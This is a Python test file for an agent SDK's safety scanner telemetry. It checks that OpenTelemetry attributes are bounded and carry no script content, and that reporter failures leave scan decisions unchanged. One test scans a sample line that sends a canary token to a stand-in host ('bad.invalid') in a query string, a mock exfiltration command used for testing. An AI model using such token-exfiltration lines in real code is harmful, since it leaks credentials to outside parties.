# Tencent is pleased to support the open source community by making tRPC-Agent-Python available.
#
# Copyright (C) 2026 Tencent. All rights reserved.
#
# tRPC-Agent-Python is licensed under Apache-2.0.
"""Optional OTel, low-cardinality attributes, and reporter isolation tests."""

from __future__ import annotations

from unittest.mock import MagicMock

from trpc_agent_sdk.safety import OpenTelemetrySafetySink
from trpc_agent_sdk.safety import SafetyDecision
from trpc_agent_sdk.safety import SafetyScanRequest
from trpc_agent_sdk.safety import SafetyScanner
from trpc_agent_sdk.safety._models import observation_from_report
from trpc_agent_sdk.safety._telemetry import safety_attributes

from .conftest import CANARY


def test_attribute_set_is_complete_low_cardinality_and_has_no_content(scanner):
    report = scanner.scan(
        SafetyScanRequest(
            script=f"import requests\nrequests.get('https://bad.invalid?token={CANARY}')",
            language="python",
        ))
    attrs = safety_attributes(observation_from_report(report))
    required = {
        "safety.decision",
        "safety.risk_level",
        "safety.blocked",
        "safety.review_required",
        "safety.rule_count",
        "safety.category_count",
        "safety.analysis_complete",
        "safety.failure_code",
        "safety.source_type",
        "safety.language",
        "safety.policy.version",
        "safety.duration_ms",
    }
    assert set(attrs) == required
    rendered = str(attrs)
    assert CANARY not in rendered
    assert "https://" not in rendered
    assert "requests.get" not in rendered


def test_unrecognized_source_and_language_are_bounded_to_other(scanner):
    report = scanner.scan(SafetyScanRequest(script="opaque", language="ruby", source_type="tenant-specific-value"))
    attrs = safety_attributes(observation_from_report(report))
    assert attrs["safety.source_type"] == "other"
    assert attrs["safety.language"] == "other"


def test_no_active_span_or_provider_is_normal(scanner):
    report = scanner.scan(SafetyScanRequest(script="print('ok')", language="python"))
    OpenTelemetrySafetySink().emit(observation_from_report(report))
    assert report.decision is SafetyDecision.ALLOW


def test_recording_span_gets_only_safety_event(monkeypatch, scanner):
    from trpc_agent_sdk.safety import _telemetry

    span = MagicMock()
    span.is_recording.return_value = True
    monkeypatch.setattr(_telemetry.trace, "get_current_span", lambda: span)
    report = scanner.scan(SafetyScanRequest(script="print('ok')", language="python"))
    OpenTelemetrySafetySink().emit(observation_from_report(report))
    span.add_event.assert_called_once()
    name, = span.add_event.call_args.args
    assert name == "safety.scan"
    assert CANARY not in str(span.add_event.call_args)


def test_reporter_failure_does_not_change_decision(monkeypatch, policy):
    from trpc_agent_sdk.safety import _telemetry

    failing = MagicMock()
    failing.add.side_effect = RuntimeError(CANARY)
    monkeypatch.setattr(_telemetry, "_scan_count", failing)
    scanner = SafetyScanner(policy, telemetry_sink=OpenTelemetrySafetySink())
    report = scanner.scan(SafetyScanRequest(script="print('ok')", language="python"))
    assert report.decision is SafetyDecision.ALLOW
